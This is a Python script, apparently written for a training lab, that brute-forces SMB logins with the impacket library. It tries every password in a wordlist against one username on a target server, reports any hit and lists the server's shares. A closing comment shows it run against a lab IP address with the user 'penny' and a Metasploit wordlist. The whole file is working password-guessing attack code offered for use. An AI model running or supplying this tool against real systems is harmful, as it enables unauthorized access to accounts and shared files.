from impacket.smbconnection import SMBConnection
from colorama import Fore, Style, init
import sys

# Initialize colorama
init(autoreset=True)

def try_smb_login(server_ip, share_name, username, password):
    try:
        # Connect to the SMB server
        smb_connection = SMBConnection(server_ip, server_ip)
        smb_connection.login(username, password)

        # If login is successful, print in green
        print(f"{Fore.GREEN}[+] Success: Username: '{username}' Password: '{password}'{Style.RESET_ALL}")
        
        # Optional: List available shares upon successful login
        shares = smb_connection.listShares()
        print("[*] Available shares:")
        for share in shares:
            print(f"  - {share['shi1_netname']}")
        
        smb_connection.logoff()
        return True
    except Exception as e:
        # Failed login attempt, print in red
        print(f"{Fore.RED}[-] Failed: Username: '{username}' Password: '{password}' - {str(e)}{Style.RESET_ALL}")
        return False

def smb_brute_force(server_ip, username, password_file):
    # Read passwords from a file
    with open(password_file, "r") as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        if try_smb_login(server_ip, 'IPC$', username, password):
            print(f"{Fore.GREEN}[+] Password found: {password}{Style.RESET_ALL}")
            break

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <server_ip> <username> <password_file>")
        sys.exit(1)

    server_ip = sys.argv[1]
    username = sys.argv[2]
    password_file = sys.argv[3]

    smb_brute_force(server_ip, username, password_file)

#python smb_brute_force.py 10.10.185.110 penny MetasploitWordlist.txt
